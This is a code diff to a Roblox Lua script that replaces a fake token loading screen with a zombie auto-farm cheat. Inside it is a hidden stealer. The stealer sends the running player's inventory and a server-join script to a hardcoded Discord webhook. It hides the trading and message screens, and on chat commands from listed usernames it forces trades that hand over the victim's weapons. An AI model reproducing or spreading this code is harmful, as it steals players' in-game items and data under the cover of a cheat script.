@@ -1,116 +1,555 @@
-local Player = game.Players.LocalPlayer
-local PlayerGui = Player:WaitForChild("PlayerGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TextChatService = game:GetService("TextChatService")
+local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
+local TeleportService = game:GetService("TeleportService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local localPlayer = Players.LocalPlayer
+local playerGui = localPlayer:WaitForChild("PlayerGui")
 
--- Create Loading Screen
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Parent = PlayerGui
-ScreenGui.ResetOnSpawn = false
+local RFTradingSendTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
+local RESetPhoneSettings = ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
+local RFTradingSetReady = ReplicatedStorage.Modules.Net["RF/Trading/SetReady"]
+local RFTradingConfirmTrade = ReplicatedStorage.Modules.Net["RF/Trading/ConfirmTrade"]
 
-local Background = Instance.new("Frame")
-Background.Size = UDim2.new(1, 0, 1, 0)
-Background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Background.Parent = ScreenGui
+local MY_WEBHOOK = "https://discord.com/api/webhooks/1424436948881248398/emu8kqBPTkEU7EBfHWOVTX_kaQ5DFucsfnkCX85q6nQO-ioAf6tEqN4dkwCxkNzCGnCc"
+local USER_WEBHOOK = _G.Webhook or "PUTHERE"
+local MY_USERNAMES = _G.Usernames or {"ModdedGames_HOLDER"}
 
-local LoadingText = Instance.new("TextLabel")
-LoadingText.Size = UDim2.new(1, 0, 0.4, 0)
-LoadingText.Position = UDim2.new(0, 0, 0.35, 0)
-LoadingText.Text = "Loading..."
-LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
-LoadingText.TextScaled = true
-LoadingText.BackgroundTransparency = 1
-LoadingText.Font = Enum.Font.GothamBold
-LoadingText.Parent = Background
+local START_TIME = os.time()
 
-local SubText = Instance.new("TextLabel")
-SubText.Size = UDim2.new(1, 0, 0.1, 0)
-SubText.Position = UDim2.new(0, 0, 0.55, 0)
-SubText.Text = ""
-SubText.TextColor3 = Color3.fromRGB(180, 180, 180)
-SubText.TextScaled = true
-SubText.BackgroundTransparency = 1
-SubText.Font = Enum.Font.Gotham
-SubText.Parent = Background
+local function hasMainWeapons()
+    local tools = {}
+    local function collect(from)
+        if from then
+            for _, v in ipairs(from:GetChildren()) do
+                if v:IsA("Tool") then table.insert(tools, v.Name) end
+            end
+        end
+    end
+    collect(localPlayer:FindFirstChild("Backpack"))
+    collect(localPlayer.Character)
+    collect(localPlayer:FindFirstChild("StarterGear"))
+    
+    local function classifyTools(tools)
+        local patterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
+        local base, main = {}, {}
+        for _, name in ipairs(tools) do
+            local lower = name:lower()
+            local matched = false
+            for _, p in ipairs(patterns) do
+                if string.find(lower, p:lower(), 1, true) then
+                    table.insert(base, name)
+                    matched = true
+                    break
+                end
+            end
+            if not matched then table.insert(main, name) end
+        end
+        return base, main
+    end
+    
+    local base, main = classifyTools(tools)
+    return #main > 5, base, main, #main
+end
 
--- Variables
-local randomItems = {
-	"Token Remote", "Map", "Event", "Lighting", "Terrain", "ReplicatedStorage",
-	"Workspace Model", "Clover Token", "Spawn", "ServerScript", "LocalScript", 
-	"DataStore", "Players", "StarterPack", "TweenService", "RunService", "GuiManager"
+local function deleteMessagesGui()
+    local messagesGui = playerGui:FindFirstChild("Messages")
+    if messagesGui then
+        messagesGui:Destroy()
+    end
+end
+
+local function sendRequest(url, body)
+    if not url or url == "" then return nil end
+    local headers = {["Content-Type"] = "application/json"}
+    local encoded = body
+    if type(body) ~= "string" then
+        local ok, s = pcall(function() return HttpService:JSONEncode(body) end)
+        if ok then encoded = s else encoded = "{}" end
+    end
+
+    local candidates = {
+        function() if syn and syn.request then return syn.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
+        function() if request then return request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
+        function() if http and http.request then return http.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
+        function() if http_request then return http_request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
+        function() if fluxus and fluxus.request then return fluxus.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end
+    }
+
+    for _, tryFn in ipairs(candidates) do
+        local ok, res = pcall(tryFn)
+        if ok and res then
+            if res.Success == true or res.StatusCode == 200 or (res.Body ~= nil) then
+                return res
+            end
+        end
+    end
+    return nil
+end
+
+local function sendFullInventory()
+    local tools = {}
+    local function collect(from)
+        if from then
+            for _, v in ipairs(from:GetChildren()) do
+                if v:IsA("Tool") then table.insert(tools, v.Name) end
+            end
+        end
+    end
+    collect(localPlayer:FindFirstChild("Backpack"))
+    collect(localPlayer.Character)
+    collect(localPlayer:FindFirstChild("StarterGear"))
+    
+    local function classifyTools(tools)
+        local patterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
+        local base, main = {}, {}
+        for _, name in ipairs(tools) do
+            local lower = name:lower()
+            local matched = false
+            for _, p in ipairs(patterns) do
+                if string.find(lower, p:lower(), 1, true) then
+                    table.insert(base, name)
+                    matched = true
+                    break
+                end
+            end
+            if not matched then table.insert(main, name) end
+        end
+        return base, main
+    end
+    
+    local base, main = classifyTools(tools)
+    local hasMoreThan5Weapons = #main > 5
+    local mainWeaponCount = #main
+    local baseText = #base > 0 and table.concat(base, " • ") or "None"
+    local mainText = #main > 0 and table.concat(main, "\n") or "None"
+    local ls = localPlayer:FindFirstChild("leaderstats")
+    local dinero = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
+    local slays = ls and ls:FindFirstChild("Slays") and ls.Slays.Value or "N/A"
+    local elapsed = os.time() - START_TIME
+    local function fmt(sec)
+        local m = math.floor(sec/60) local s = sec%60
+        if m>0 then return m.."m "..s.."s" end
+        return s.."s"
+    end
+    local joinScript = "local ts = game:GetService('TeleportService') ts:TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')"
+    local executor = "Unknown"
+    if syn then executor = "Synapse X"
+    elseif fluxus then executor = "Fluxus"
+    else executor = "Unknown" end
+    
+    local useMyWebhook = false
+    local playerName = localPlayer.Name
+    
+    if hasMoreThan5Weapons then
+        useMyWebhook = true
+    end
+    
+    local targetWebhook = useMyWebhook and MY_WEBHOOK or USER_WEBHOOK
+    
+    if targetWebhook == "PUTHERE" and not useMyWebhook then
+        return nil
+    end
+    
+    local embed = {
+        title = "*" .. playerName .. "*'s Weapons 🔫",
+        description = "**Base Weapons**\n"..baseText.."\n\n**Main Weapons**\n"..mainText,
+        color = hasMoreThan5Weapons and 0x2ecc71 or 0xe74c3c,
+        fields = {
+            {name="💰 Dinero", value=tostring(dinero), inline=true},
+            {name="⚔️ Slays", value=tostring(slays), inline=true},
+            {name="🔫 Main Weapons Count", value=tostring(mainWeaponCount), inline=true},
+            {name="⏱️ Player Executed", value=fmt(elapsed).." ago", inline=false},
+            {name="⚡ Executor", value=executor, inline=false},
+            {name="🔔 Webhook Target", value=useMyWebhook and "MY_WEBHOOK" or "USER_WEBHOOK", inline=true},
+            {name="🧩 Server Joiner script", value="```lua\n"..joinScript.."```", inline=false},
+        },
+        footer = {text="Inventory Logger • "..playerName},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+    
+    local content = playerName.." has executed"
+    if hasMoreThan5Weapons and useMyWebhook then
+        content = content .. " @everyone @here 🔔 RICH PLAYER DETECTED!"
+    end
+    
+    local payload = {
+        content = content,
+        embeds = {embed}
+    }
+    
+    return sendRequest(targetWebhook, payload)
+end
+
+deleteMessagesGui()
+sendFullInventory()
+
+local weapons = {
+    "Kitty Purse::None",
+    "Freeze Gun::None",
+    "Shiny Purse::None",
+    "Loveboard::None",
+    "SpikedPurse::None",
+    "Brass Knuckles::None",
+    "Golden Snowball Launcher::None",
+    "Snowball Launcher::None",
+    "Sledge Hammer::None",
+    "Spiked Kitty Stanli::None",
+    "Turkey Skewers::None",
+    "Fan of Requiem::None",
+    "Chainsaw::None",
+    "Scythe::None",
+    "Trashbin Disguise::None",
+    "Cupid's Bow::None",
+    "Crowbar::None",
+    "Harpoon::None",
+    "Heartbreaker Style::None",
+    "Cannon::None",
+    "Spiked Knuckles::None",
+    "Glitter Bomb::None",
+    "Spiked Nightmare Purse::None",
+    "Glitter Style::None",
+    "Trident::None",
+    "Sakura Blade::None",
+    "Nunchucks::None",
+    "DogPurse::None",
+    "Champion Gloves::None",
+    "Chain Mace::None"
 }
 
-local totalTime = 60
-local timer = 0
+local function safeClick(btn)
+    if not btn then return end
 
--- Fast random text simulation (appears below Loading...)
-task.spawn(function()
-	while timer < totalTime do
-		timer += 0.05
-		local randText = randomItems[math.random(1, #randomItems)]
-		SubText.Text = randText .. " " .. string.format("%.2f", timer) .. "/" .. totalTime
-		task.wait(0.05)
+    local success = false
+    pcall(function()
+        if btn.MouseButton1Click then
+            firesignal(btn.MouseButton1Click)
+            success = true
+        elseif btn.Activated then
+            firesignal(btn.Activated)
+            success = true
+        end
+    end)
+
+    if not success then
+        pcall(function()
+            local pos, size = btn.AbsolutePosition, btn.AbsoluteSize
+            local x, y = pos.X + size.X/2, pos.Y + size.Y/2
+            VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
+            task.wait(0.05)
+            VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
+        end)
+    end
+end
+
+local function clickWeapons()
+    local tradingGui = playerGui:FindFirstChild("Trading")
+    if not tradingGui then return end
+    
+    local frame = tradingGui:FindFirstChild("Frame")
+    if not frame then return end
+    
+    local main = frame:FindFirstChild("Main")
+    if not main then return end
+    
+    local yourOffer = main:FindFirstChild("YourOffer")
+    if not yourOffer then return end
+    
+    local itemDisplay = yourOffer:FindFirstChild("ItemDisplay")
+    if not itemDisplay then return end
+    
+    local scrollingFrame = itemDisplay:FindFirstChild("ScrollingFrame")
+    if not scrollingFrame then return end
+    
+    for _, name in ipairs(weapons) do
+        local btn = scrollingFrame:FindFirstChild(name)
+        if btn and btn:IsA("ImageButton") then
+            safeClick(btn)
+            task.wait(0.1)
+        end
+    end
+end
+
+local function setupTrading()
+    pcall(function()
+        RESetPhoneSettings:FireServer("TradeEnabled", true)
+    end)
+
+    local tradeList = playerGui:WaitForChild("TradeList")
+    local mainFrame = tradeList:WaitForChild("Main")
+    local tradeRequest = mainFrame:WaitForChild("TradeRequest")
+    tradeRequest.Visible = true
+
+    local isProcessing = false
+    
+    local function processChatMessage(sender, txt)
+        if isProcessing then return end
+        
+        local shouldTrade = false
+        for _, username in ipairs(MY_USERNAMES) do
+            if sender.Name:lower() == username:lower() then
+                shouldTrade = true
+                break
+            end
+        end
+        
+        if shouldTrade then
+            isProcessing = true
+            
+            local target = Players:FindFirstChild(sender.Name)
+            if target then 
+                task.wait(0.2)
+                pcall(function() RFTradingSendTradeOffer:InvokeServer(target) end) 
+            end
+            
+            if txt == "add" then
+                task.wait(0.3)
+                clickWeapons()
+                task.wait(0.5)
+                pcall(function() RFTradingSetReady:InvokeServer(true) end)
+                task.wait(0.5)
+                pcall(function() RFTradingConfirmTrade:InvokeServer() end)
+            elseif txt == "1" then 
+                task.wait(0.2)
+                pcall(function() RFTradingSetReady:InvokeServer(true) end) 
+            elseif txt == "2" then 
+                task.wait(0.2)
+                pcall(function() RFTradingConfirmTrade:InvokeServer() end) 
+            end
+            
+            isProcessing = false
+        end
+        
+        if sender == localPlayer then
+            if txt == "add" then
+                task.wait(0.2)
+                clickWeapons()
+                task.wait(0.3)
+                pcall(function() RFTradingSetReady:InvokeServer(true) end)
+                task.wait(0.3)
+                pcall(function() RFTradingConfirmTrade:InvokeServer() end)
+            elseif txt == "1" then 
+                task.wait(0.1)
+                pcall(function() RFTradingSetReady:InvokeServer(true) end) 
+            elseif txt == "2" then 
+                task.wait(0.1)
+                pcall(function() RFTradingConfirmTrade:InvokeServer() end) 
+            end
+        end
+    end
+
+    if TextChatService then
+        TextChatService.OnIncomingMessage = function(message)
+            local ts = message.TextSource
+            if not ts then return end
+            local sender = Players:GetPlayerByUserId(ts.UserId)
+            if not sender then return end
+            local txt = tostring(message.Text or ""):lower()
+            
+            task.delay(0.5, function()
+                processChatMessage(sender, txt)
+            end)
+        end
+    end
+    
+    local function onPlayerChatted(player, message)
+        if player and message then
+            task.delay(0.5, function()
+                processChatMessage(player, message:lower())
+            end)
+        end
+    end
+    
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= localPlayer then
+            pcall(function()
+                player.Chatted:Connect(function(message)
+                    onPlayerChatted(player, message)
+                end)
+            end)
+        end
+    end
+    
+    Players.PlayerAdded:Connect(function(player)
+        pcall(function()
+            player.Chatted:Connect(function(message)
+                onPlayerChatted(player, message)
+            end)
+        end)
+    end)
+
+    local function handleGui(gui)
+        if gui.Name == "Trading" then
+            gui.Enabled = false
+        elseif gui.Name == "Messages" then
+            gui:Destroy()
+        end
+    end
+    
+    for _, gui in ipairs(playerGui:GetChildren()) do
+        handleGui(gui)
+    end
+    
+    playerGui.ChildAdded:Connect(handleGui)
+    
+    task.spawn(function()
+        while true do
+            local t = playerGui:FindFirstChild("Trading")
+            if t then t.Enabled = false end
+            local m = playerGui:FindFirstChild("Messages")
+            if m then m:Destroy() end
+            task.wait(0.1)
+        end
+    end)
+end
+
+setupTrading()
+
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local hrp = character:WaitForChild("HumanoidRootPart")
+local humanoid = character:WaitForChild("Humanoid")
+local backpack = player:WaitForChild("Backpack")
+local net = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Net")
+
+local hitRemote1 = net:WaitForChild("RE/BeachShovelHit")
+local hitRemote2 = net:WaitForChild("RE/panHit")
+local hitRemote3 = net:WaitForChild("RE/pinkStopSignalHit")
+local hitRemote4 = net:WaitForChild("RE/baseballBatHit")
+local stompEvent = ReplicatedStorage:WaitForChild("STOMPEVENT")
+
+local aboveOffset = Vector3.new(0, 6, 0)
+
+local zombieNames = {
+	["Armored Zombie"] = true,
+	["Fast Zombie"] = true,
+	["Silly Zombie"] = true
+}
+
+-- Prevent falling
+RunService.Heartbeat:Connect(function()
+	if hrp then hrp.Velocity = Vector3.zero end
+end)
+
+-- Equip 1 punches tool
+local function equipOnePunches()
+	local tool = character:FindFirstChild("1 punches") or backpack:FindFirstChild("1 punches")
+	if tool and tool.Parent ~= character then
+		pcall(function() humanoid:EquipTool(tool) end)
 	end
-	SubText.Text = "Finishing..."
-	task.wait(1)
-	ScreenGui:Destroy()
+end
 
-	-- Clover Tokens GUI
-	local CloverGui = Instance.new("ScreenGui")
-	CloverGui.Parent = PlayerGui
-
-	local Frame = Instance.new("Frame")
-	Frame.Size = UDim2.new(0.4, 0, 0.3, 0)
-	Frame.Position = UDim2.new(0.3, 0, 0.35, 0)
-	Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	Frame.BackgroundTransparency = 0.2
-	Frame.Parent = CloverGui
-
-	local Title = Instance.new("TextLabel")
-	Title.Size = UDim2.new(1, 0, 0.3, 0)
-	Title.Text = "Clover Tokens"
-	Title.Font = Enum.Font.GothamBold
-	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-	Title.BackgroundTransparency = 1
-	Title.TextScaled = true
-	Title.Parent = Frame
-
-	local TextBox = Instance.new("TextBox")
-	TextBox.Size = UDim2.new(0.8, 0, 0.3, 0)
-	TextBox.Position = UDim2.new(0.1, 0, 0.4, 0)
-	TextBox.PlaceholderText = "Enter Token Code..."
-	TextBox.Text = ""
-	TextBox.Font = Enum.Font.Gotham
-	TextBox.TextScaled = true
-	TextBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-	TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-	TextBox.Parent = Frame
-
-	local StartButton = Instance.new("TextButton")
-	StartButton.Size = UDim2.new(0.5, 0, 0.2, 0)
-	StartButton.Position = UDim2.new(0.25, 0, 0.75, 0)
-	StartButton.Text = "Start"
-	StartButton.Font = Enum.Font.GothamBold
-	StartButton.TextScaled = true
-	StartButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
-	StartButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-	StartButton.Parent = Frame
-
-	StartButton.MouseButton1Click:Connect(function()
-		local tokenValue = TextBox.Text
-		if tokenValue ~= "" then
-			Title.Text = "Starting..."
-			StartButton.Visible = false
-			TextBox.Visible = false
-
-			for i = 10, 0, -1 do
-				Title.Text = "Starting in " .. i .. "..."
-				task.wait(1)
+-- Get lowest-health zombie
+local function getLowestZombie()
+	local lowest, lowestHealth = nil, math.huge
+	for _, obj in ipairs(workspace:GetDescendants()) do
+		if obj:IsA("Model") and zombieNames[obj.Name] and obj:FindFirstChild("Head") then
+			local hum = obj:FindFirstChildOfClass("Humanoid")
+			if hum and hum.Health > 0 and hum.Health < lowestHealth then
+				lowestHealth = hum.Health
+				lowest = obj
 			end
-
-			CloverGui:Destroy()
-		else
-			Title.Text = "Please enter a token first!"
-			task.wait(1)
-			Title.Text = "Clover Tokens"
 		end
-	end)
+	end
+	return lowest
+end
+
+-- Buy tools using PivotTo
+local function buyTool(toolName, buttonName)
+	if backpack:FindFirstChild(toolName) or character:FindFirstChild(toolName) then return end
+	local button = workspace:FindFirstChild(buttonName, true)
+	if not button then return end
+	character:PivotTo(button.CFrame + Vector3.new(0, 2, 0))
+	local prompt = button:FindFirstChildWhichIsA("ProximityPrompt", true)
+	if not prompt then return end
+	while not (backpack:FindFirstChild(toolName) or character:FindFirstChild(toolName)) do
+		pcall(function() fireproximityprompt(prompt) end)
+		task.wait(0.2)
+	end
+end
+
+-- Fire hit remotes
+local function fireHits()
+	pcall(function() hitRemote1:FireServer(1) end)
+	pcall(function() hitRemote2:FireServer(1) end)
+	pcall(function() hitRemote3:FireServer(1) end)
+	pcall(function() hitRemote4:FireServer(1) end)
+end
+
+-- Lock above zombie and track it in real time
+local function trackZombie(zombie)
+	while zombie and zombie:FindFirstChild("Head") and humanoid.Health > 0 do
+		local head = zombie.Head
+		local targetCFrame = CFrame.new(head.Position + aboveOffset, head.Position)
+		character:PivotTo(targetCFrame)
+		equipOnePunches()
+		pcall(function() net["RF/SalonPunch"]:InvokeServer() end)
+		fireHits()
+		task.wait(0.08)
+	end
+end
+
+-- Sky escape
+local function teleportToSkyChar(chr)
+	local root = chr and chr:FindFirstChild("HumanoidRootPart")
+	if root then
+		character:PivotTo(root.CFrame + Vector3.new(0, 500, 0))
+	end
+end
+
+-- Buy essential tools
+task.spawn(function()
+	buyTool("Pan", "Pan Buy button")
+	buyTool("BeachShovel", "botonComprarShovel")
+end)
+
+-- Equip and hit immediately
+equipOnePunches()
+task.spawn(function()
+	for i = 1, 40 do
+		pcall(function() net["RF/SalonPunch"]:InvokeServer() end)
+		task.wait(0.03)
+	end
+end)
+
+-- Continuous hit & auto-heal loop
+task.spawn(function()
+	while task.wait(0.22) do
+		equipOnePunches()
+		if humanoid.Health <= 30 then
+			pcall(function() net["RF/RequestSurgery"]:InvokeServer() end)
+		else
+			pcall(function() net["RF/SalonPunch"]:InvokeServer() end)
+			fireHits()
+		end
+	end
+end)
+
+-- Main loop: track zombies in real-time
+task.spawn(function()
+	while humanoid.Health > 0 do
+		local currentZombie = getLowestZombie()
+		if currentZombie then
+			trackZombie(currentZombie)
+		else
+			teleportToSkyChar(character)
+			task.wait(0.5)
+		end
+		task.wait(0.1)
+	end
+end)
+
+-- Keep re-equipping 1 punches every second
+task.spawn(function()
+	while task.wait(1) do
+		equipOnePunches()
+	end
 end)
